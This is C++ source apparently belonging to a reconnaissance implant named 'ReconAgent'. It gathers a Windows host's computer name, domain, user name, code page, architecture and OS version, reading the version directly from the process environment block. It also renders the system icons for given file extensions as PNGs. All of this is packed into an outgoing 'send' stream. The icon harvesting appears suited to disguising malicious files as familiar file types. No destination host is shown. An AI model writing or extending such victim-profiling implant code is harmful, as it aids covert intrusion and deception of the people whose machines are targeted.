#include "framework.h"
#include "ReconAgent.h"
#include "GetSysInfo.h"
#include <CommCtrl.h>
#include <LM.h>
#include <shellapi.h>
#include <Shlobj.h>

#pragma comment(lib, "comctl32")
#pragma comment(lib, "gdiplus")
#pragma comment(lib, "netapi32")
#pragma comment(lib, "shell32")
#pragma comment(lib, "shlwapi")

#pragma warning(disable: 4996)	//Add this to allow deprecated API to be used

DWORD GetInfo(HANDLE hHeap, LPSTREAM pStrm2Send)
{
	WCHAR pwszStr[MAX_PATH];
	LPWSTR pwszRet;
	DWORD dwBufLen, dwVersion;
	LPSTREAM pStrm2Save = /*/shlwapi.dll#12/*/SHCreateMemStream(0, 0);
	/*/shlwapi.dll#212/*/IStream_Write(pStrm2Save, "\xff\xfe", 2);
	/*/shlwapi.dll#212/*/IStream_Write(pStrm2Save, L"Computer Name: ", 30);
	dwBufLen = MAX_PATH;
	/*/kernel32.dll/*/GetComputerNameW(pwszStr, &dwBufLen);
	/*/shlwapi.dll#212/*/IStream_Write(pStrm2Save, pwszStr, dwBufLen * sizeof(WCHAR));
	NETSETUP_JOIN_STATUS dwJoinType;
	pwszRet = NULL;
	/*/netapi32.dll/*/NetGetJoinInformation(NULL, &pwszRet, &dwJoinType);
	if (dwJoinType >= NetSetupWorkgroupName)
	{
		if (dwJoinType == NetSetupWorkgroupName)
			/*/shlwapi.dll#212/*/IStream_Write(pStrm2Save, L"\r\nWorkgroup Name: ", 36);
		else
			/*/shlwapi.dll#212/*/IStream_Write(pStrm2Save, L"\r\nDomain Name: ", 30);
		dwBufLen = /*/kernel32.dll/*/lstrlenW(pwszRet);
		/*/shlwapi.dll#212/*/IStream_Write(pStrm2Save, pwszRet, dwBufLen * sizeof(WCHAR));
	}
	/*/netapi32.dll/*/NetApiBufferFree(pwszRet);
	pwszRet = NULL;
	dwBufLen = MAX_PATH;
	/*/advapi32.dll/*/GetUserNameW(pwszStr, &dwBufLen);
	/*/shlwapi.dll#212/*/IStream_Write(pStrm2Save, L"\r\nUser Name: ", 26);
	/*/shlwapi.dll#212/*/IStream_Write(pStrm2Save, pwszStr, dwBufLen * sizeof(WCHAR) - 2);
	UINT codePage = /*/kernel32.dll/*/GetACP();
	/*/user32.dll/*/wsprintfW(pwszStr, L"\r\nCodepage: %d", codePage);
	dwBufLen = /*/kernel32.dll/*/lstrlenW(pwszStr);
	/*/shlwapi.dll#212/*/IStream_Write(pStrm2Save, pwszStr, dwBufLen * sizeof(WCHAR));
	pwszRet = pwszStr + /*/kernel32.dll/*/GetSystemWindowsDirectoryW(pwszStr, MAX_PATH);
	/*/shlwapi.dll#212/*/IStream_Write(pStrm2Save, L"\r\nOS Arch: ", 22);
	/*/kernel32.dll/*/lstrcpyW(pwszRet, L"\\SyChpe32");
	if (/*/shlwapi.dll/*/PathFileExistsW(pwszStr))
		/*/shlwapi.dll#212/*/IStream_Write(pStrm2Save, L"arm64", 10);
	else
	{
		/*/kernel32.dll/*/lstrcpyW(pwszRet, L"\\SysWOW64");
		if (/*/shlwapi.dll/*/PathFileExistsW(pwszStr))
			/*/shlwapi.dll#212/*/IStream_Write(pStrm2Save, L"x64", 6);
		else
			/*/shlwapi.dll#212/*/IStream_Write(pStrm2Save, L"x86", 6);
	}
	pwszRet = NULL;
	OSVERSIONINFOEXW osVerInfo;
	osVerInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);
	/*/kernel32.dll/*/GetVersionExW((LPOSVERSIONINFOW)&osVerInfo);
	/*/shlwapi.dll#212/*/IStream_Write(pStrm2Save, L"\r\nOS Version:\r\n\tWindows ", 48);
	LPBYTE pVerVonPEB =
#if defined(_M_ARM64)
		* ((LPBYTE*)(__getReg(18) + 0x60)) + 0x0118;
#elif defined(_M_X64)
		(LPBYTE)__readgsqword(0x60) + 0x0118;
#else
		(LPBYTE)__readfsdword(0x30) + 0xA4;
#endif
	switch (osVerInfo.wProductType)
	{
	case VER_NT_WORKSTATION:
		/*/shlwapi.dll#212/*/IStream_Write(pStrm2Save, L"Workstation\r\n\t", 28);
		break;
	case VER_NT_DOMAIN_CONTROLLER:
		/*/shlwapi.dll#212/*/IStream_Write(pStrm2Save, L"Domain Center\r\n\t", 32);
		break;
	case VER_NT_SERVER:
		/*/shlwapi.dll#212/*/IStream_Write(pStrm2Save, L"Server\r\n\t", 18);
		break;
	}
	osVerInfo.dwMajorVersion = *((LPDWORD)pVerVonPEB);
	osVerInfo.dwMinorVersion = *((LPDWORD)(pVerVonPEB + 4));
	osVerInfo.dwBuildNumber = *((LPWORD)(pVerVonPEB + 8));
	dwVersion = osVerInfo.dwMajorVersion;
	/*/user32.dll/*/wsprintfW(pwszStr, L"%d.%d Build %d", osVerInfo.dwMajorVersion, osVerInfo.dwMinorVersion, osVerInfo.dwBuildNumber);
	dwBufLen = /*/kernel32.dll/*/lstrlenW(pwszStr);
	/*/shlwapi.dll#212/*/IStream_Write(pStrm2Save, pwszStr, dwBufLen * sizeof(WCHAR));
	if (/*/kernel32.dll/*/lstrlenW(osVerInfo.szCSDVersion))
	{
		/*/shlwapi.dll#212/*/IStream_Write(pStrm2Save, L" ", sizeof(WCHAR));
		dwBufLen = /*/kernel32.dll/*/lstrlenW(osVerInfo.szCSDVersion);
		/*/shlwapi.dll#212/*/IStream_Write(pStrm2Save, osVerInfo.szCSDVersion, dwBufLen * sizeof(WCHAR));
	}
	ULARGE_INTEGER uiSize;
	/*/shlwapi.dll#214/*/IStream_Size(pStrm2Save, &uiSize);
	pwszRet = (LPWSTR)/*/kernel32.dll/*/HeapAlloc(hHeap, HEAP_ZERO_MEMORY, uiSize.LowPart);
	/*/shlwapi.dll#213/*/IStream_Reset(pStrm2Save);
	/*/shlwapi.dll#184/*/IStream_Read(pStrm2Save, pwszRet, uiSize.LowPart);
	/*/shlwapi.dll#169/*/IUnknown_AtomicRelease((LPVOID*)&pStrm2Save);
	/*/shlwapi.dll#212/*/IStream_Write(pStrm2Send, "SysInfo.txt", 12);
	/*/shlwapi.dll#212/*/IStream_Write(pStrm2Send, &uiSize.LowPart, sizeof(DWORD));
	/*/shlwapi.dll#212/*/IStream_Write(pStrm2Send, pwszRet, uiSize.LowPart);
	/*/kernel32.dll/*/HeapFree(hHeap, 0, pwszRet);
	return dwVersion;
}

void GetIcons(HANDLE hHeap, DWORD dwVersion, LPSTREAM pStrm2Send, LPCSTR pszExts)
{
	HIMAGELIST hImgList = NULL;
	HIMAGELIST hImgListSmall = NULL;
	LPSTREAM pStrmRet = NULL;
	BOOL bIconOK = FALSE, bCodecOK = FALSE;
	GUID guidIImageList =
	{
		0x46eb5926,	0x582e, 0x4017,
		{ 0x9f,0xdf,0xe8,0x99,0x8d,0xaa,0x09,0x50}
	};
	if (dwVersion < 6)
		bIconOK = /*/shell32.dll/*/Shell_GetImageLists(&hImgList, &hImgListSmall);
	else
		bIconOK = (/*/shell32.dll/*/SHGetImageList(SHIL_JUMBO, guidIImageList, (LPVOID*)&hImgList) == S_OK);
	if (bIconOK)
	{
		UINT num = 0, size = 0, i;
		// Initialize GDI+
		GdiplusStartupInput gdiplusStartupInput = { 1,0,0,0 };
		ULONG_PTR gdiplusToken;
		/*/gdiplus.dll/*/GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
		// Get CodecInfo Before Getting Icon
		CLSID encoderClsid;
		ImageCodecInfo* pImageCodecInfo = NULL;
		SHFILEINFOA sfi;
		/*/gdiplus.dll/*/GdipGetImageEncodersSize(&num, &size);
		if (size != 0)
		{
			pImageCodecInfo = (ImageCodecInfo*)/*/kernel32.dll/*/HeapAlloc(hHeap, HEAP_ZERO_MEMORY, size);
			if (pImageCodecInfo != NULL)
			{

				/*/gdiplus.dll/*/GdipGetImageEncoders(num, size, pImageCodecInfo);
				for (i = 0; i < num; i++)
				{
					if (/*/kernel32.dll/*/lstrcmpW(pImageCodecInfo[i].MimeType, L"image/png") == 0)
					{
						bCodecOK = TRUE;
						/*/ntdll.dll/*/RtlMoveMemory(&encoderClsid, &pImageCodecInfo[i].Clsid, sizeof(CLSID));
						break;
					}
				}
				/*/kernel32.dll/*/HeapFree(hHeap, 0, pImageCodecInfo);
			}
		}
		if (bCodecOK)
		{
			CHAR pszFName[12];
			while (pszExts[0])
			{
				LPSTREAM pStrmPNG = /*/shlwapi.dll#12/*/SHCreateMemStream(0, 0);
				/*/ntdll.dll/*/RtlZeroMemory(&sfi, sizeof(SHFILEINFOA));
				/*/ntdll.dll/*/RtlZeroMemory(pszFName, 12);
				pszFName[0] = 'a';
				pszFName[1] = '.';
				/*/kernel32.dll/*/lstrcatA(pszFName, pszExts);
				DWORD_PTR dwRet = /*/shell32.dll/*/SHGetFileInfoA(pszFName, NULL, &sfi, sizeof(SHFILEINFOA), SHGFI_SYSICONINDEX | SHGFI_USEFILEATTRIBUTES);
				if (dwRet)
				{
					HICON hIcon = /*/comctl32.dll/*/ImageList_GetIcon(hImgList, sfi.iIcon, ILD_TRANSPARENT);
					void* pGpBMP = NULL;
					/*/gdiplus.dll/*/GdipCreateBitmapFromHICON(hIcon, &pGpBMP);
					if (pGpBMP)
					{
						/*/gdiplus.dll/*/GdipSaveImageToStream(pGpBMP, pStrmPNG, &encoderClsid, NULL);
						/*/gdiplus.dll/*/GdipDisposeImage(pGpBMP);
					}
					/*/user32.dll/*/DestroyIcon(hIcon);
				}
				ULARGE_INTEGER ulSize;
				/*/shlwapi.dll#214/*/IStream_Size(pStrmPNG, &ulSize);
				if (ulSize.QuadPart)
				{
					/*/ntdll.dll/*/RtlZeroMemory(pszFName, 12);
					/*/kernel32.dll/*/lstrcatA(pszFName, pszExts);
					/*/kernel32.dll/*/lstrcatA(pszFName, ".png");
					/*/shlwapi.dll#213/*/IStream_Reset(pStrmPNG);
					LPBYTE pBufPNG = (LPBYTE)/*/kernel32.dll/*/HeapAlloc(hHeap, HEAP_ZERO_MEMORY, ulSize.LowPart);
					/*/shlwapi.dll#184/*/IStream_Read(pStrmPNG, pBufPNG, ulSize.LowPart);
					/*/shlwapi.dll#212/*/IStream_Write(pStrm2Send, pszFName, 12);
					/*/shlwapi.dll#212/*/IStream_Write(pStrm2Send, &ulSize.LowPart, sizeof(DWORD));
					/*/shlwapi.dll#212/*/IStream_Write(pStrm2Send, pBufPNG, ulSize.LowPart);
					/*/kernel32.dll/*/HeapFree(hHeap, 0, pBufPNG);
				}
				/*/shlwapi.dll#169/*/IUnknown_AtomicRelease((LPVOID*)&pStrmPNG);
				pszExts += /*/kernel32.dll/*/lstrlenA(pszExts);
				pszExts += 1;
			}
		}
		/*/gdiplus.dll/*/GdiplusShutdown(gdiplusToken);
	}
}